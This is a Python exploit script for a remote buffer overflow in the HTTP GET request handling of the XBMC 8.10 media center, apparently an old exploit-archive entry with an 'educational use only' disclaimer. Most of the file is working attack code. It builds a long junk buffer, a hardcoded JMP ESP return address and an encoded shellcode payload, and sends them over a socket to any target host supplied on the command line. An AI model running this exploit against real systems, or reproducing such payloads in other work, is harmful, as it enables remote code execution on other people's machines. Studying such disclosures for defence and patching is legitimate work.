#!/usr/bin/env python 
'''
Xbmc get request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng
Vendor url:http://xbmc.org/ 
Release date:April the 1st 2009

versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
 
Restrictions:Bad chars need to be filtered. 
 
This exploit happens when parsing and overly long 
get request.We can gain control of the $eip register 
the next 4bytes of our user supplied data is copied into 
$esp register. 
 
The 3 buffer overflows i found in xbmc have nothing in 
common they are 3 separate overflow.Please see poc code 
for further analysis. 
 
I tried to evade the filtering when passing the shell code 
by loading it into the other fields that where available. 
 
We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 
 
Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!

'''

import sys, socket 
import struct

port = 80 
host = sys.argv[1] 
Junk_buffer = 'A'*1010
Jump_esp = struct.pack('<L',0x77F84143)

Shell_code=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"
)
# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Junk_buffer + Jump_esp + Shell_code)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 